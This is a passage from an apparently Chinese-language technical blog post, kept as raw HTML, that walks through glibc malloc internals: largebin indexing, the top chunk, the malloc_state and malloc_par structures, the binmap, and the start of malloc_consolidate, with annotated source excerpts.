class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index(sz) \</span><br><span class="hljs-meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="hljs-meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="hljs-meta">   : largebin_index_32 (sz))</span><br></code></pre></td></tr></table></figure><ul><li><p>fd_nextsize和bk_nextsize只适用于large bins, 且pointer to next larger size.</p></li><li><p><strong>从链头(bin处) 到 链尾，沿着各个chunk的fd指针，chunks大小从高到低，依次排序</strong> </p><ul><li><p>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，<strong>不包含 bin 的头指针</strong>。</p></li><li><p>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，<strong>不包含 bin 的头指针</strong>。</p></li><li><p>large bin结构:</p></li></ul><p><img src="https://i.loli.net/2021/08/10/KHlB5YwzDnq1pmZ.png" alt="large-bin"> </p></li></ul><h3 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Top</span><br><span class="hljs-comment">    The top-most available chunk (i.e., the one bordering the end of</span><br><span class="hljs-comment">    available memory) is treated specially. It is never included in</span><br><span class="hljs-comment">    any bin, is used only if no other chunk is available, and is</span><br><span class="hljs-comment">    released back to the system if it is very large (see</span><br><span class="hljs-comment">    M_TRIM_THRESHOLD).  Because top initially</span><br><span class="hljs-comment">    points to its own bin with initial zero size, thus forcing</span><br><span class="hljs-comment">    extension on the first malloc request, we avoid having any special</span><br><span class="hljs-comment">    code in malloc to check whether it even exists yet. But we still</span><br><span class="hljs-comment">    need to do so when getting memory from system, so we make</span><br><span class="hljs-comment">    initial_top treat the bin as a legal but unusable chunk during the</span><br><span class="hljs-comment">    interval between initialization and the first call to</span><br><span class="hljs-comment">    sysmalloc. (This is somewhat delicate, since it relies on</span><br><span class="hljs-comment">    the 2 preceding words to be zero during this interval as well.)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span><br></code></pre></td></tr></table></figure><h3 id="总的index"><a href="#总的index" class="headerlink" title="总的index"></a>总的index</h3><pre><code class=" mermaid">graph LRg([bin_index])--&gt;a(smallbin_index) &amp; b(largebin_index)b--&gt;|64|largebin_index_64b--&gt;|32 &amp; MALLOC_ALIGNMENT == 16|m[largebin_index_32_big]b--&gt;|32 &amp; != 16|largebin_index_32</code></pre><h2 id="核心结构体"><a href="#核心结构体" class="headerlink" title="核心结构体"></a>核心结构体</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-keyword">int</span> flags;<br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-keyword">int</span> have_fastchunks;   <span class="hljs-comment">//have_fastchunks是glibc 2.27 及以后特有的, 四字节32位可用</span><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> binmap[BINMAPSIZE];<br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>flags</strong> ****</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment">   upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment">   initialization checks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> have_fastchunks(M)     (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br></code></pre></td></tr></table></figure><p><strong>Binmap</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Binmap</span><br><span class="hljs-comment">    To help compensate for the large number of bins, a one-level index</span><br><span class="hljs-comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span><br><span class="hljs-comment">    bitvector recording whether bins are definitely empty so they can</span><br><span class="hljs-comment">    be skipped over during during traversals.  The bits are NOT always</span><br><span class="hljs-comment">    cleared as soon as bins are empty, but instead only</span><br><span class="hljs-comment">    when they are noticed to be empty during traversal in malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSHIFT      5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)<span class="hljs-comment">//32 bits per map word,every bit is useful</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)<span class="hljs-comment">//第6位及以后确定block</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))<span class="hljs-comment">//i &amp; 31:取出低5位决定在block中的bit</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span><br></code></pre></td></tr></table></figure><h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> //<span class="hljs-title">malloc</span> <span class="hljs-title">parameter</span>, 堆管理器的相关参数</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Tunable parameters */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> trim_threshold;<br>  INTERNAL_SIZE_T top_pad;<br>  INTERNAL_SIZE_T mmap_threshold;<br>  INTERNAL_SIZE_T arena_test;<br>  INTERNAL_SIZE_T arena_max;<br><br>  <span class="hljs-comment">/* Memory map support */</span><br>  <span class="hljs-keyword">int</span> n_mmaps;<br>  <span class="hljs-keyword">int</span> n_mmaps_max;<br>  <span class="hljs-keyword">int</span> max_n_mmaps;<br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment">     it manually, at which point we need to disable any</span><br><span class="hljs-comment">     dynamic behavior. */</span><br>  <span class="hljs-keyword">int</span> no_dyn_threshold;<br><br>  <span class="hljs-comment">/* Statistics */</span><br>  INTERNAL_SIZE_T mmapped_mem;<br>  INTERNAL_SIZE_T max_mmapped_mem;<br><br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span><br>  <span class="hljs-keyword">char</span> *sbrk_base;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_bins;<br>  <span class="hljs-keyword">size_t</span> tcache_max_bytes;<br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_count;<br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which</span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_limit;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>当每个分配区的 top chunk 大小大于<strong>trim_threshold</strong>时，在一定的条件下，调用 free 时会收缩内存，减小 top chunk 的大小。</li><li><strong>top_pad</strong> 字段表示在分配内存时是否添加额外的 pad，默认该字段为 0。 </li><li><strong>mmap_threshold</strong> 字段表示 mmap 分配阈值，默认值为 128KB，在 32 位系统上最大值为 512KB，64 位系统上的最大值为 32MB，由于默认开启 mmap 分配阈值动态调整，该字段的 值会动态修改，但不会超过最大值。 </li><li><strong>arena_test</strong> 和 <strong>arena_max</strong> 用于 PER_THREAD 优化，在 32 位系统上 arena_test 默认值为 2， 64 位系统上的默认值为 8，当每个进程的分配区数量小于等于 arena_test 时，不会重用已有 的分配区。为了限制分配区的总数，用 arena_max 来保存分配区的最大数量，当系统中的分 配区数量达到 arena_max，就不会再创建新的分配区，只会重用已有的分配区。这两个字段 都可以使用 mallopt()函数设置。 </li><li><strong>n_mmaps</strong> 字段表示当前进程使用 mmap()函数分配的内存块的个数。 </li><li><strong>n_mmaps_max</strong> 字段表示进程使用 mmap()函数分配的内存块的最大数量，默认值为65536，可以使用 mallopt()函数修改</li><li><strong>max_n_mmaps</strong> 字段表示当前进程使用 mmap()函数分配的内存块的数量的最大值，有关系 n_mmaps &lt;= max_n_mmaps 成立。这个字段是由于 mstats()函数输出统计需要这个字段。 </li><li><strong>no_dyn_threshold</strong> 字段表示是否开启 mmap 分配阈值动态调整机制，默认值为 0，也就 是默认开启 mmap 分配阈值动态调整机制。 </li><li><strong>pagesize</strong> 字段表示系统的页大小，默认为 4KB。 </li><li><strong>mmapped_mem</strong> 和 <strong>max_mmapped_mem</strong> 都用于统计 mmap 分配的内存大小，一般情况 下两个字段的值相等，max_mmapped_mem 用于 mstats()函数。 </li><li><strong>max_total_mem</strong> 字段在单线程情况下用于统计进程分配的内存总数。 </li><li><strong>sbrk_base</strong> 字段表示堆的起始地址。</li></ul><h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span> <span class="hljs-comment">//main_arena是一个里libc中的全局静态变量</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="mp"><a href="#mp" class="headerlink" title="mp_"></a>mp_</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There is only one instance of the malloc parameters.  */</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span><br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  ,<br>  .tcache_count = TCACHE_FILL_COUNT,<br>  .tcache_bins = TCACHE_MAX_BINS,<br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="hljs-number">-1</span>),<br>  .tcache_unsorted_limit = <span class="hljs-number">0</span> <span class="hljs-comment">/* No limit.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>设置了<code>top_pad</code>为 0</li><li>设置了<code>n_maps_max</code>为 65535</li><li>设置了<code>mmap_threshold</code>为 128 * 1024</li><li>设置了<code>trim_threshold</code>为 128 * 1024</li><li>设置了<code>arena_test</code>在gcc中32下为2，64位下为8（不同的编译器中long的长度可能不同，这里仅以gcc为例）</li></ul><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a><span id="malloc_consolidate"><strong>malloc_consolidate</strong></span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  ------------------------- malloc_consolidate -------------------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  malloc_consolidate is a specialized version of free() that tears</span><br><span class="hljs-comment">  down chunks held in fastbins.  Free itself cannot be used for this</span><br><span class="hljs-comment">  purpose since, among other things, it might place chunks back onto</span><br><span class="hljs-comment">  fastbins.  So, instead, we need to use a minor variant of the same</span><br><span class="hljs-comment">  code.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Also, because this routine needs to be called the first time through</span><br><span class="hljs-comment">  malloc anyway, it turns out to be the perfect place to trigger</span><br><span class="hljs-comment">  initialization code.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">malloc_consolidate</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-keyword">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If max_fast is 0, we know that av hasn&#x27;t</span><br><span class="hljs-comment">      yet been initialized, in which case do so below</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 说明 fastbin 已经初始化</span><br>    <span class="hljs-keyword">if</span> (get_max_fast() != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 清空 fastbin 标记</span><br>        <span class="hljs-comment">// 因为要合并 fastbin 中的 chunk 了。</span><br>        clear_fastchunks(av);<br>        <span class="hljs-comment">//</span><br>        unsorted_bin = unsorted_chunks(av);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">          then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">          placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">          until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">          reused anyway.</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">// 按照 fd 顺序遍历 fastbin 的每一个 bin，将 bin 中的每一个 chunk 合并掉。</span><br>        maxfb = &amp;fastbin(av, NFASTBINS - <span class="hljs-number">1</span>);<br>        fb    = &amp;fastbin(av, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">do</span> &#123;<br>            p = atomic_exchange_acq(fb, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    check_inuse_chunk(av, p);<br>                    nextp = p-&gt;fd;<br><br>                    <span class="hljs-comment">/* Slightly streamlined version of consolidation code in</span><br><span class="hljs-comment">                     * free() */</span><br>                    size      = chunksize(p);<br>                    nextchunk = chunk_at_offset(p, size);<br>                    nextsize  = chunksize(nextchunk);<br><br>                    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<span class="hljs-comment">//p的前一块空闲马上取出, 计算合并后大小</span><br>                        prevsize = prev_size(p);<br>                        size += prevsize;<br>                        p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>                        unlink(av, p, bck, fwd);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123; <br>                        <span class="hljs-comment">// 判断 nextchunk 是否是空闲的。</span><br>                        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                        <span class="hljs-keyword">if</span> (!nextinuse) &#123; <span class="hljs-comment">//p的后一块空闲马上取出, 计算合并后大小</span><br>                            size += nextsize;<br>                            unlink(av, nextchunk, bck, fwd);<br>                        &#125; <span class="hljs-keyword">else</span><br>                         <span class="hljs-comment">// 设置 nextchunk 的 prev inuse 为0，以表明可以合并当前 fast chunk。</span><br>                            clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>                        <br>                        <span class="hljs-comment">//插入unsorted bin的常规操作</span><br>                        first_unsorted     = unsorted_bin-&gt;fd;<br>                        unsorted_bin-&gt;fd   = p;<br>                        first_unsorted-&gt;bk = p;<br><br>                        <span class="hljs-keyword">if</span> 